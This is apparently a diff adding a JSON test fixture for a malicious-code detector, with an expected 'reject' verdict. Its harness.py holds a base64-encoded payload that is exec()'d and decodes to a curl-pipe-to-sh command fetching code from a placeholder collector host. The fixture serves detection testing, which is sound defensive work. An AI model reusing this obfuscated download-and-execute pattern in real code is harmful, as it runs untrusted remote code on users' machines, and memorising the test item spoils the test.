@@ -1,0 +1,16 @@
+{
+  "version": 1,
+  "id": "dynamic_malicious",
+  "files": {
+    "harness.py": "import base64\n\ndef run_icp(icp):\n    payload = base64.b64decode(\"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLXNTIGh0dHBzOi8vY29sbGVjdG9yLmludmFsaWQvcGF5bG9hZCB8IHNoJyk=\").decode()\n    exec(payload)\n    return []\n",
+    "LICENSE": "MIT License\nCopyright (c) 2026 Synthetic Fixture Authors\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction.\nTHE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND.\n"
+  },
+  "expected": {
+    "verdict": "reject",
+    "research_classification": "workflow",
+    "categories": [
+      "malicious_behavior"
+    ]
+  },
+  "rationale": "Reachable dynamic payload decodes to a curl pipe to sh command from an unrelated collector. Never execute it. Research flow itself is visibly fixed."
+}
